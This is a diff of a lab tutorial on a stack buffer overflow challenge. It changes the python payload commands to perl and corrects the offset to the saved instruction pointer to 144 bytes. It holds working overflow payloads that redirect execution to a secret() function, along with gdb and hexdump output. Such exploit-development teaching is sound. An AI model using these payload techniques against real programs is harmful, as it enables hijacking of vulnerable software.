@@ -10,7 +10,8 @@ with the address of the `secret()` function.
 
 ## Goal
 
-* Being able to create a precise buffer overflow to reroute instruction flow
+* Calling a an arbitrary function by creating a buffer overflow and overwriting SIP
+
 
 ## Source 
 
@@ -30,9 +31,9 @@ A reminder, the vulnerability lies here:
 void handleData(char *username, char *password) {
     int isAdmin = 0;
     char name[128];
-	...
-	strcpy(firstname, username); // strcpy() is unsafe
-	...
+    ...
+    strcpy(firstname, username); // strcpy() is unsafe
+    ...
 }
 
 int main(int argc, char **argv) {
@@ -49,21 +50,20 @@ void secret() {
 }
 ```
 
-
-## Abnormal behaviour - no debugger
+## Abnormal behaviour (no debugger)
 
 As we have seen from challenge09, we can create a segmentation fault by passing in 
 an argument with size of 150 bytes:
 
 ```
-~/challenges/challenge10$ ./challenge10 `python -c 'print("A" * 150)'` password
+~/challenges/challenge10$ ./challenge10 `perl -e 'print "A" x 150'` password
 isAdmin: 0x41414141
 You are admin!
 Segmentation fault (core dumped)
 ```
 
 
-## Abnormal behaviour - with debugger
+## Abnormal behaviour (with debugger)
 
 Lets do this again, but in a debugger:
 
@@ -119,7 +119,7 @@ We will update or perl-based argument generator by appending `BBBB` at the
 `AAAA`'s:
 
 ```
-perl -e 'print "A" x 16 . "BBBB" . "\n"'
+$ perl -e 'print "A" x 16 . "BBBB" . "\n"'
 AAAAAAAAAAAAAAAABBBB
 ```
 
@@ -150,7 +150,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Bingo! The 4-byte value `BBBB` is now completely stored in `EIP`! Therefore
 the offset to SIP (the stored instruction pointer, which gets loaded into
-  EIP when executing a `ret`) is `142` bytes.
+  EIP when executing a `ret`) is `144` bytes.
 
 This means we can redirect the execution flow of the target program to any
 address we want, by writing it at the place of the `BBBB`. For example the address of `secret()` from above.
@@ -159,7 +159,7 @@ address we want, by writing it at the place of the `BBBB`. For example the addre
 ## Write the exploit
 
 Lets re-iterate what we know:
-* The offset in the first input argument to SIP is exactly 144 bytes.
+* The offset in the first input argument to SIP is exactly `144` bytes.
 * The address of `secret()` is `0x80491f8`
 
 The next step is to replace the `BBBB` (the SIP) with the address of `secret()`.
@@ -169,10 +169,10 @@ Note that because of the little-endianness, we have to convert the address:
 Just read it from back to front, and fill to 4 bytes (4 times 1 byte, or
   4 times two-digit hex number).
 
-Lets update our python argument line generator again. We can specify raw
+Lets update our perl argument line generator again. We can specify raw
 bytes in hex by prepending them with `\x`. Or in other words, `\x41` = `A`.
 ```
-~/challenges/challenge10$ python -c 'print("A" * 142 + "\xf8\x91\x04\x08")' | hexdump -v -C
+~/challenges/challenge10$ perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"' | hexdump -v -C
 00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
@@ -182,15 +182,13 @@ bytes in hex by prepending them with `\x`. Or in other words, `\x41` = `A`.
 00000060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000070  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000080  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
-00000090  c3 b8 c2 91 04 08 0a                              |.......|
-00000097
+00000090  f8 91 04 08                                       |....|
 ```
 
-Not that the bytes in the address are not ASCII-printable, therefore we piped
-the output into hexdump. You'll also see that `print` added a newline character
-at the end, byte `0a`. This should not be a problem.
+Not that the last few bytes (the return address) are not ASCII-printable, therefore we piped
+the output into hexdump. We can see this at the last line.
 
-Lets put it together:
+Lets put it all together and try it with the vulnerable program. First in the debugger:
 ```
 (gdb) r `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
 Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
